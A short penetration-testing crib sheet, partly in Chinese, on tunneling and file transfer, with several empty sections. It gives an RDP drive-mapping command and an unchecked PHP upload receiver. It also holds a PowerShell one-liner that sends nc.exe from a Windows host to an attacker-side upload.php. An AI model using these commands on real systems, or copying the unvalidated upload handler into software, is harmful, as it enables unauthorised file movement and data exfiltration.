# Tunnel Proxy Transfer

## Tunnel

### chisel

<https://github.com/jpillora/chisel>

chisel 是一个用于创建隧道的工具，它可以通过HTTP代理或者SOCKS5代理来创建隧道。

### dnsmasq

## Proxy

## Transfer

### download

#### rdp

```bash
xfreerdp /u:username /p:password /v:172.16.8.137 /w:1024 /h:768 /drive:home,/home/kali/Downloads
```

### upload

#### appache php server

/var/www/html/upload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

```powershell
powershell (new-object System.Net.WebClient).UploadFile('http://172.16.8.144/upload.php', 'C:\Users\Public\nc.exe')
```

## Tips

1.
